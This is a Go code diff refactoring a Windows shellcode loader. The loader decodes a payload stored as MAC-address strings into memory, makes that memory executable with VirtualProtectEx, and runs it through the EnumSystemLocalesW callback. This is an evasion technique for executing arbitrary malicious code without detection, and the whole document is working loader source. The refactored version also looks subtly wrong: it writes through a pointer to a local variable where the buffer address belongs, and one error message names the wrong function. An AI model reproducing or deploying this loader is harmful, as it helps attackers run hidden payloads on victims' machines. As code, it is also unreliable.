@@ -3,36 +3,44 @@ package loader
 import (
 	"unsafe"
 	"variant/log"
-	"variant/wdll"
+	"variant/xwindows"
 
 	"golang.org/x/sys/windows"
 )
 
 func MacAddressA(shellcode []string) {
-	addr, _, err := wdll.AllocADsMem().Call(uintptr(len(shellcode) * 6))
+	addr, err := xwindows.AllocADsMem(uintptr(len(shellcode) * 6))
 	if addr == 0 {
 		log.Fatalf("AllocADsMem() err: %v", err)
 	}
 
-	addrptr := addr
+	addrPtr := addr
 	for _, mac := range shellcode {
 		u := append([]byte(mac), 0)
 
-		_, _, err = wdll.RtlEthernetStringToAddressA().Call(uintptr(unsafe.Pointer(&u[0])), uintptr(unsafe.Pointer(&u[0])), addrptr)
+		_, err = xwindows.RtlEthernetStringToAddressA(
+			uintptr(unsafe.Pointer(&u[0])),
+			&u[0],
+			(*byte)(unsafe.Pointer(&addrPtr)),
+		)
 		if err != nil && err.Error() != "The operation completed successfully." {
 			log.Fatalf("RtlEthernetStringToAddressA() err: %v", err)
 		}
 
-		addrptr += 6
+		addrPtr += 6
 	}
 
 	oldProtect := windows.PAGE_READWRITE
-	wdll.VirtualProtectEx().Call(
-		uintptr(windows.CurrentProcess()),
+	errVPEx := xwindows.VirtualProtectEx(
+		windows.CurrentProcess(),
 		addr,
 		uintptr(len(shellcode)*6),
 		windows.PAGE_EXECUTE_READWRITE,
-		uintptr(unsafe.Pointer(&oldProtect)))
+		(*uint32)(unsafe.Pointer(&oldProtect)),
+	)
+	if errVPEx != nil {
+		log.Fatalf("RtlEthernetStringToAddressA() err: %v", errVPEx)
+	}
 
-	wdll.EnumSystemLocalesW().Call(addr, 0)
+	_, _ = xwindows.EnumSystemLocalesW(addr, 0)
 }
